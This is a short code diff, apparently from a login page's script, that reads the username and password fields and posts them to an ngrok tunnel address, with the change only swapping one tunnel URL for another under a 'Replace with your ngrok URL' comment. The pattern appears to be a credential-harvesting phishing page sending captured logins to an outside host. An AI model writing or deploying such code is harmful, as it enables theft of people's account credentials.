@@ -7,7 +7,7 @@
         const username = document.getElementById('login').value;
         const password = document.getElementById('password').value;
 
-        fetch('https://c4b3-184-64-18-124.ngrok-free.app', { // Replace with your ngrok URL
+        fetch('https://44b7-184-64-18-124.ngrok-free.app', { // Replace with your ngrok URL
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
